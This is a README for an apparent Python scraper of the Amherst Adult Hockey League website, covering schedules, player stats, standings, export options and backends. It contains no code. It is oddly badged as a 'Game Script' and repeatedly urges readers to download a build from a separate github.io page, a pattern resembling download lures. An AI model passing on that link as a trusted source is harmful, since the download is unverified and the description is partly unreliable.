# AAHL Scraper v2026 - Game Script Utility 2026

> **A web scraping tool for the Amherst Adult Hockey League website.** Designed for Python-based workflows that collect schedules, player stats, and team standings using either HTTP requests or Playwright-driven automation.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jason-cooperfge7608/aahl-scraper-2026?style=flat-square)](https://github.com/jason-cooperfge7608/aahl-scraper-2026)

---

<p align="center">
  <a href="https://jason-cooperfge7608.github.io/aahl-scraper-2026/">
    <img src="https://img.shields.io/badge/Download-AAHL%20Scraper%20Script-brightgreen?style=for-the-badge" alt="Download AAHL Scraper Script">
  </a>
</p>

> **[Direct Download - AAHL Scraper](https://jason-cooperfge7608.github.io/aahl-scraper-2026/)**

---

[Download Latest Build](https://jason-cooperfge7608.github.io/aahl-scraper-2026/)

---

## What It Does

AAHL Scraper is a Python utility built to pull data from the Amherst Adult Hockey League website. It focuses on league pages that expose schedules, player statistics, and team standings, then packages that information so it can be reused in other tools, reports, or automation pipelines.

It offers both HTTP and Playwright scraping modes, so you can match the backend to the behavior of the target page. The project also includes backend diagnostics, which helps during first-time setup as well as when you are checking how scraping behaves after a site update.

## Features

- Pulls schedules, player statistics, and team standings
- Works with both HTTP and Playwright scraping backends
- Parses page content with BeautifulSoup
- Writes collected data to JSON
- Writes collected data to CSV
- Ships with built-in backend diagnostics
- Supports CLI use and a Python API
- Can be used alongside Yodeck digital signage displays

## Getting Started

1. Download or clone the repository.
2. Install the required Python dependencies for scraping and parsing.
3. Run the scraper from the command line, or import it into your own Python project.

Example CLI usage:

    python aahlscraper.py

Example Python usage:

    from aahlscraper import scraper
    data = scraper.fetch()

If browser-based rendering is needed, choose the Playwright backend. If the page can be retrieved directly, the HTTP backend may be sufficient.

## Options

Common runtime settings include backend choice, export format, and diagnostics.

| Option | Purpose |
| --- | --- |
| `--backend http` | Use the HTTP scraping backend |
| `--backend playwright` | Use the Playwright scraping backend |
| `--export json` | Save output as JSON |
| `--export csv` | Save output as CSV |
| `--diagnostics` | Show backend diagnostics |
| `--api` | Access the Python API instead of CLI mode |

You can also combine scraping output with Yodeck-oriented delivery if your workflow includes digital signage.

## Compatibility Notes

AAHL Scraper is intended for Python environments and is tailored to the Amherst Adult Hockey League website. Which backend you use can influence how well it handles dynamic content, browser requirements, or changes in the site structure.

Known considerations:

- HTTP scraping is typically lighter, but may be limited by page structure
- Playwright is better suited for content that depends on browser rendering
- Export behavior depends on the selected output format
- Site layout changes may require selector or parsing updates

## FAQ

**How do I get started?**  
Install the Python dependencies, then run the scraper from the CLI or call it through the Python API.

**Which backend is the right fit?**  
Use HTTP for straightforward page retrieval. Use Playwright when the page requires browser rendering or interactive loading.

**Can I switch export formats?**  
Yes. The project supports JSON and CSV exports.

**Is it built for just one league site?**  
The current profile is centered on the Amherst Adult Hockey League website and its data structure.

**Does it support digital signage workflows?**  
Yes. The feature set includes Yodeck integration for signage-oriented workflows.

**How can I troubleshoot scraping problems?**  
Use the built-in diagnostics to compare backend behavior and identify where collection differs.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
